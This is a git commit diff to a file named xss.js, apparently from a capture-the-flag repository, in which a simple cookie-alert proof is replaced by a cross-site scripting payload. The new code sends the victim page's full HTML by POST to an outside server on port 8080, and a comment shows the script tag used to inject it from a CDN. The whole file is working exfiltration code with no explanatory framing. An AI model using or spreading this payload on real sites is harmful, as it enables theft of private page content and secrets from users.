7a9ac4b3ac44a16b67709dd992ed77f42157080b
xSlendiX <gamingxslendix@gmail.com>
2020-11-26 00:30:07 +0200

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,3 +1,12 @@
 (()=>{
-  alert(document.cookie);
+  // alert(document.cookie);
+  // <script src="https://cdn.jsdelivr.net/gh/xslendix/ctff@main/xss.js"></script>
+  var data = new FormData();
+  data.append('data', document.documentElement.innerHTML);
+
+  var xhr = new XMLHttpRequest();
+  xhr.open('POST', 'http://xslendi.xyz:8080', true);
+  xhr.onload = function () {
+  };
+  xhr.send(data);
 })()
